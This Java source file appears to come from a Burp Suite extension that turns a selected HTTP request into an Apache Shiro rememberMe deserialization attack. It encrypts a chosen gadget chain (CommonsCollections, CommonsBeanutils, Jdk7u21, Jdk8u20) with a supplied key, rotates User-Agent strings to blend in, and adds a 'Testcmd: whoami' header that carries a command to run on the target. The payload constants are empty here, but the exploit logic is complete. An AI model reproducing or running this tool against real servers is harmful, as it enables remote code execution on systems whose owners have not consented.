public class Utils {

    public static void xrayGadgets(String selectGadget, IContextMenuInvocation invocation) throws Exception {

        String CommonsCollectionsK1 = "";
        String CommonsCollectionsK2 = "";
        String CommonsBeanutils1 = "";
        String CommonsBeanutils2 = "";
        String Jdk7u21 = "";
        String Jdk8u20 = "";

        //获取body
        IHttpRequestResponse iReqResp = invocation.getSelectedMessages()[0];
        byte[] request = iReqResp.getRequest();
        IRequestInfo requestInfo = BurpExtender.helpers.analyzeRequest(request);
        int bodyOffset = requestInfo.getBodyOffset();
        int body_length = request.length - bodyOffset;
        String body = new String(request, bodyOffset, body_length, "UTF-8");
        //获取header
        List<String> headers = BurpExtender.helpers.analyzeRequest(request).getHeaders();

        System.out.println("mode：" + Config.getMode());
        String rememberMe = "rememberMe=";
        Encrypt en = new Encrypt();
        //随机ua头
        String[] ua = {
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
            "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
            "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
        };
        Random rand = new Random();
        int num = rand.nextInt(12);

        //修改header头
        List<String> headers2 = new ArrayList<>();
        headers2.add(headers.get(0));
        headers2.add(headers.get(1));
        headers2.add("User-Agent: " + ua[num]);
        headers2.add("Testcmd: whoami");

        switch (selectGadget) {
            case "k1":
                if (Config.getMode()==0) {
                    rememberMe += en.cbc(Config.getKey().trim(), Base64.decode(CommonsCollectionsK1));
                } else {
                    rememberMe += en.gcm(Config.getKey().trim(), Base64.decode(CommonsCollectionsK1));
                }
                break;
            case "k2":
                if (Config.getMode()==0) {
                    rememberMe += en.cbc(Config.getKey().trim(), Base64.decode(CommonsCollectionsK2));
                } else {
                    rememberMe += en.gcm(Config.getKey().trim(), Base64.decode(CommonsCollectionsK2));
                }
                break;
            case "cb1":
                if (Config.getMode()==0) {
                    rememberMe += en.cbc(Config.getKey().trim(), Base64.decode(CommonsBeanutils1));
                } else {
                    rememberMe += en.gcm(Config.getKey().trim(), Base64.decode(CommonsBeanutils1));
                }
                break;
            case "cb2":
                if (Config.getMode()==0) {
                    rememberMe += en.cbc(Config.getKey().trim(), Base64.decode(CommonsBeanutils2));
                } else {
                    rememberMe += en.gcm(Config.getKey().trim(), Base64.decode(CommonsBeanutils2));
                }
                break;
            case "Jdk7u21":
                if (Config.getMode()==0) {
                    rememberMe += en.cbc(Config.getKey().trim(), Base64.decode(Jdk7u21));
                } else {
                    rememberMe += en.gcm(Config.getKey().trim(), Base64.decode(Jdk7u21));
                }
                break;
            case "Jdk8u20":
                if (Config.getMode()==0) {
                    rememberMe += en.cbc(Config.getKey().trim(), Base64.decode(Jdk8u20));
                } else {
                    rememberMe += en.gcm(Config.getKey().trim(), Base64.decode(Jdk8u20));
                }
                break;
            default:
                break;
        }
        headers2.add("Cookie: " + rememberMe);
        headers2.add("Accept-Encoding: gzip");


        byte[] bytes = new byte[]{};
        bytes = BurpExtender.helpers.buildHttpMessage(headers2, body.getBytes());
        iReqResp.setRequest(bytes);
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

}
